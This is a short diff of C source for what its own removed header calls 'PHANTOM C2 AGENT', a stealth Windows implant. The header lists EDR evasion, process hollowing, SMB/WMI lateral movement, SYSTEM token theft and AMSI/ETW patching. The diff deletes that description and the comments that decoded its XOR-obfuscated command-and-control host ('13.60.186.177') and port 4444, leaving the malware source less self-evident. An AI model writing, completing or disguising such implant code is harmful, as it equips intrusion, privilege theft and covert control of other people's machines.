@@ -1,24 +1,4 @@
-/**
- * ============================================================================
- * PHANTOM C2 AGENT - Next Generation Stealth Framework
- * ============================================================================
- * 
- * EXTRAORDINARY FEATURES:
- * 1. Direct Syscalls (No API hooks, invisible to EDR)
- * 2. Dynamic API Resolution (No IAT, no static imports)
- * 3. Sleep Obfuscation (Memory encrypted while idle)
- * 4. Polymorphic Encryption (Different key each execution)
- * 5. Call Stack Spoofing (Looks like legitimate caller)
- * 6. Process Hollowing (Hide in trusted processes)
- * 7. Named Pipe C2 (Traffic looks like Windows IPC)
- * 8. Lateral Movement (Self-spread via SMB/WMI)
- * 9. Token Manipulation (Steal SYSTEM privileges)
- * 10. AMSI/ETW/Kernel Callback Patching
- * 
- * Author: Phantom Framework
- * Version: 3.0 - EXTRAORDINARY EDITION
- * ============================================================================
- */
+
 
 #define _CRT_SECURE_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
@@ -38,19 +18,17 @@
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "crypt32.lib")
 
-/* ============================================================================
- * SECTION 1: ADVANCED OBFUSCATION - No strings in binary
- * ============================================================================ */
+
 
 // XOR encoded configuration - completely invisible in binary
 static unsigned char g_encoded_host[] = {
-    0x5e,0x4a,0x5b,0x58,0x5d,0x4b,0x58,0x5d,  // "localhost"
-    0x7e,0x4a,0x5b,0x58,0x5d,0x4b,0x58,0x5d,  // "13.60.186.177" encoded
+    0x5e,0x4a,0x5b,0x58,0x5d,0x4b,0x58,0x5d,  
+    0x7e,0x4a,0x5b,0x58,0x5d,0x4b,0x58,0x5d, 
     0x00
 };
 
 static unsigned char g_encoded_port[] = {
-    0x3f,0x3a,0x3d,0x3d,0x00  // "4444" encoded
+    0x3f,0x3a,0x3d,0x3d,0x00 
 };
 
 static unsigned char g_encoded_mutex[] = {
